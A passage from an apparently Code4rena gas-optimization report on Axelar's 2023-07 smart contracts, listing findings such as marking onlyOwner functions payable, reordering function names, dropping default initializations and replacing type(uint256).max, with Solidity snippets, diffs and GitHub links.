which costs an average of about 21 gas per call to the function, in addition to the extra deployment costs.</p>\n<details>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L96-L96\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L96-L96</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setWhitelistedProposalCaller</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">93:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">94:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceCaller</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">95:         </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">whitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L111-L111\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L111-L111</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setWhitelistedProposalSender</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">108:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">109:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceSender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">110:         </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">whitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/gmp-sdk/upgradable/Upgradable.sol#L56-L56\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/gmp-sdk/upgradable/Upgradable.sol#L56-L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">upgrade</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">53:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">newImplementation</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">54:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">newImplementationCodeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">55:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L547-L547\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L547-L547</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">547</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPaused</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">paused</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L83-L83\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L83-L83</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addTrustedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L95-L95\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L95-L95</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeTrustedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chain</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L106-L106\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L106-L106</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addGatewaySupportedChains</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chainNames</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">  </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L119-L119\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L119-L119</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeGatewaySupportedChains</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chainNames</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L343-L345\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L343-L345</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">343</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployCustomTokenManager</span><span class=\"mtk1\">( </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">344:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">345:         </span><span class=\"mtk10\">TokenManagerType</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenManagerType</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">346:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPaused</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L365-L368\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L365-L368</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployRemoteCustomTokenManager</span><span class=\"mtk1\">( </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">366:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">367:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">368:         </span><span class=\"mtk10\">TokenManagerType</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenManagerType</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">369:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">370:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">gasValue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPaused</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L509-L509\">https://github.com/code-423n4/2023-07-axelar/tree/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L509-L509</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">502</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transmitSendToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">503:         </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">504:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sourceAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">505:         </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">506:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">507:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">508:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">metadata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">509</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyTokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">notPaused</span><span class=\"mtk1\">  </span></span></span></code></pre>\n</details>\n<h2 id=\"g-08-optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g-08-optimize-names-to-save-gas\" aria-label=\"g 08 optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Optimize names to save gas</h2>\n<p>Saves 27 instances.</p>\n<p>Public/external function names and public member variable names can be optimized to save gas. See this <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">link</a> for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save 128 gas each during deployment, and renaming functions to have lower method IDs will save 22 gas per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///@audit getProposalEta(),executeProposal(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///@audit executeMultisigProposal(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarServiceGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///@audit getChainName(),getTokenManagerAddress(),getValidTokenManagerAddress(),getTokenAddress(),getStandardizedTokenAddress(),getCanonicalTokenId(),getCustomTokenId(),getImplementation(),getParamsLockUnlock(),getParamsMintBurn(),getParamsLiquidityPool(),getFlowLimit(),getFlowOutAmount(),getFlowInAmount(),registerCanonicalToken(),deployRemoteCanonicalToken(),deployCustomTokenManager(),deployRemoteCustomTokenManager(),deployAndRegisterStandardizedToken(),deployAndRegisterRemoteStandardizedToken(),expressReceiveToken(),expressReceiveTokenWithData(),transmitSendToken(),setFlowLimit(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span></code></pre>\n<h2 id=\"g-09-default-value-initialization\" style=\"position:relative;\"><a href=\"#g-09-default-value-initialization\" aria-label=\"g 09 default value initialization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Default value initialization</h2>\n<p>Saves <code>80 GAS</code> in 4 instances</p>\n<p>If a variable is not set/initialized, it is assumed to have the default value<code>(0, false, 0x0 etc depending on the data type)</code>. Explicitly initializing it with its default value is an anti-pattern and wastes gas.</p>\n<p>Saves <code>15-20</code> GAS per instance. </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/interchain-governance-executor/InterchainProposalSender.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 63: for (uint256 i = 0; i &lt; interchainCalls.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 63: for (uint256 i; i &lt; interchainCalls.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 105: uint256 totalGas = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 105: uint256 totalGas ;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 106: for (uint256 i = 0; i &lt; interchainCalls.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 106: for (uint256 i ; i &lt; interchainCalls.length; ) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalSender.sol#L63\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalSender.sol#L63</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/interchain-governance-executor/InterchainProposalExecutor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 74: for (uint256 i = 0; i &lt; calls.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 74: for (uint256 i ; i &lt; calls.length; i++) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L74\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L74</a></p>\n<h2 id=\"g-10-use-constants-instead-of-typeuintxmax\" style=\"position:relative;\"><a href=\"#g-10-use-constants-instead-of-typeuintxmax\" aria-label=\"g 10 use constants instead of typeuintxmax permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Use constants instead of <code>type(uintX).max</code></h2>\n<p>Saves <code>91 GAS</code> in 7 instances.</p>\n<p>Using constants instead of <code>type(uintX).max</code> saves gas in Solidity. This is because the <code>type(uintX).max</code> function has to dynamically calculate the maximum value of a uint256, which can be expensive in terms of gas. Constants, on the other hand, are stored in the bytecode of your contract, so they do not have to be recalculated every time you need them. Saves <code>13 GAS</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">allowance_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> 